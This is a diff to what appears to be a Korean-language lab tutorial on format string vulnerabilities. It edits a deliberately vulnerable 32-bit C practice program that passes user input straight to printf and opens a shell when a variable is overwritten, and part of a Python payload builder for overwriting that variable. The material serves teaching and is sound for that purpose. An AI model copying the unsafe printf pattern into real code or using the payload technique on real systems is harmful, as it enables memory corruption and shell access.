@@ -138,18 +138,18 @@ offset = 6
 ### 실습 환경
 
 ```c
-int target = 0xcafebabe;
-char buf[100];
+    int target = 0xcafebabe;
+    char buf[100];
 
-printf("target addr = %p\n", &target);
-fgets(buf, sizeof(buf), stdin);
-printf(buf);
-printf("\ntarget = 0x%x\n", target);
+    printf("target addr = %p\n", &target);
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf); //포맷 스트링 취약점
+    printf("\ntarget = 0x%x\n", target);
 
-if (target == 0xdeadbeef) {
-    printf("good!\n");
-    system("/bin/bash");
-}
+    if(target == 0xdeadbeef){
+	printf("good!\n");
+        system("/bin/bash");
+    }
 ```
 
 * 32bit
@@ -157,6 +157,8 @@ if (target == 0xdeadbeef) {
 * Stack Canary 없음
 * NX 켜짐 (쉘코드 주입 불가)
 * 입력 함수: `fgets`
+
+※ 실습 편의상 ASLR 설정을 잠시 꺼두었음.
 
 
 ### 4.1 Offset 계산
@@ -240,8 +242,8 @@ ef be ad de
 ```python
 import struct, sys
 
-t = 0xffffce4c
-base = 6
+t = {target_addr}
+base = {offset}
 vals = [0xef, 0xbe, 0xad, 0xde]
 
 payload  = struct.pack("<I", t)
